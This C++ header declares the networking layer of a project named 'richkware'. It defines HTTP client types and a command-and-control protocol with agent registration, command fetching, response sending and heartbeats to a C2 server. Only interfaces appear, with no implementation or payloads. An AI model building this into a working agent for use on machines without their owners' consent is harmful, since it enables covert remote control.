#pragma once

#include "../core/types.hpp"
#include <string>
#include <memory>
#include <functional>
#include <future>

namespace richkware::network {

/**
 * @brief Network protocol types
 */
enum class Protocol {
    HTTP,
    HTTPS,
    TCP,
    UDP
};

/**
 * @brief HTTP methods
 */
enum class HttpMethod {
    GET,
    POST,
    PUT,
    DELETE
};

/**
 * @brief HTTP request structure
 */
struct HttpRequest {
    HttpMethod method{HttpMethod::GET};
    std::string url;
    std::string body;
    std::map<std::string, std::string> headers;
    core::Duration timeout{30000};
};

/**
 * @brief HTTP response structure
 */
struct HttpResponse {
    std::uint16_t status_code{0};
    std::string body;
    std::map<std::string, std::string> headers;
};

/**
 * @brief Network client interface
 */
class INetworkClient {
public:
    virtual ~INetworkClient() = default;
    
    /**
     * @brief Send HTTP request
     * @param request HTTP request to send
     * @return Future with HTTP response or error
     */
    [[nodiscard]] virtual std::future<core::Result<HttpResponse>> 
    send_request(const HttpRequest& request) = 0;
    
    /**
     * @brief Connect to server
     * @param address Server address
     * @param port Server port
     * @return Result indicating success or failure
     */
    [[nodiscard]] virtual core::Result<void> connect(
        const std::string& address, std::uint16_t port) = 0;
    
    /**
     * @brief Disconnect from server
     */
    virtual void disconnect() = 0;
    
    /**
     * @brief Check if connected
     * @return true if connected, false otherwise
     */
    [[nodiscard]] virtual bool is_connected() const noexcept = 0;
};

/**
 * @brief Secure HTTP client implementation
 */
class HttpsClient : public INetworkClient {
public:
    HttpsClient();
    ~HttpsClient() override;
    
    // Non-copyable, movable
    HttpsClient(const HttpsClient&) = delete;
    HttpsClient& operator=(const HttpsClient&) = delete;
    HttpsClient(HttpsClient&&) = default;
    HttpsClient& operator=(HttpsClient&&) = default;
    
    [[nodiscard]] std::future<core::Result<HttpResponse>> 
    send_request(const HttpRequest& request) override;
    
    [[nodiscard]] core::Result<void> connect(
        const std::string& address, std::uint16_t port) override;
    
    void disconnect() override;
    
    [[nodiscard]] bool is_connected() const noexcept override;
    
    /**
     * @brief Set certificate verification
     * @param verify Enable/disable certificate verification
     */
    void set_verify_certificate(bool verify);
    
    /**
     * @brief Set custom CA certificate
     * @param cert_path Path to CA certificate file
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> set_ca_certificate(const std::string& cert_path);

private:
    class Impl;
    std::unique_ptr<Impl> pimpl_;
};

/**
 * @brief Command and control protocol handler
 */
class C2Protocol {
public:
    /**
     * @brief Command structure
     */
    struct Command {
        std::string id;
        std::string type;
        std::string payload;
        core::TimePoint timestamp;
    };
    
    /**
     * @brief Command response structure
     */
    struct CommandResponse {
        std::string command_id;
        bool success{false};
        std::string output;
        std::string error;
        core::TimePoint timestamp;
    };
    
    /**
     * @brief Construct with network client
     * @param client Network client to use
     * @param encryption_key Encryption key for communications
     */
    C2Protocol(INetworkClient& client, std::string encryption_key);
    
    ~C2Protocol();
    
    // Non-copyable, movable
    C2Protocol(const C2Protocol&) = delete;
    C2Protocol& operator=(const C2Protocol&) = delete;
    C2Protocol(C2Protocol&&) = default;
    C2Protocol& operator=(C2Protocol&&) = default;
    
    /**
     * @brief Register agent with C2 server
     * @param agent_info Agent information
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> register_agent(const std::string& agent_info);
    
    /**
     * @brief Fetch commands from C2 server
     * @return Commands or error
     */
    [[nodiscard]] core::Result<std::vector<Command>> fetch_commands();
    
    /**
     * @brief Send command response to C2 server
     * @param response Command response
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> send_response(const CommandResponse& response);
    
    /**
     * @brief Send heartbeat to C2 server
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> send_heartbeat();

private:
    class Impl;
    std::unique_ptr<Impl> pimpl_;
};

/**
 * @brief High-level network client for agent operations
 */
class NetworkClient {
public:
    /**
     * @brief Construct with configuration
     * @param server_address C2 server address
     * @param server_port C2 server port
     * @param encryption_key Encryption key
     * @param use_tls Enable TLS encryption
     */
    NetworkClient(std::string server_address, 
                  std::uint16_t server_port,
                  std::string encryption_key,
                  bool use_tls = true);
    
    ~NetworkClient();
    
    // Non-copyable, movable
    NetworkClient(const NetworkClient&) = delete;
    NetworkClient& operator=(const NetworkClient&) = delete;
    NetworkClient(NetworkClient&&) = default;
    NetworkClient& operator=(NetworkClient&&) = default;
    
    /**
     * @brief Initialize network client
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> initialize();
    
    /**
     * @brief Connect to C2 server
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> connect();
    
    /**
     * @brief Disconnect from C2 server
     */
    void disconnect();
    
    /**
     * @brief Check if connected
     * @return true if connected, false otherwise
     */
    [[nodiscard]] bool is_connected() const noexcept;
    
    /**
     * @brief Get C2 protocol handler
     * @return Reference to C2 protocol
     */
    [[nodiscard]] C2Protocol& protocol() noexcept;

private:
    class Impl;
    std::unique_ptr<Impl> pimpl_;
};

} // namespace richkware::network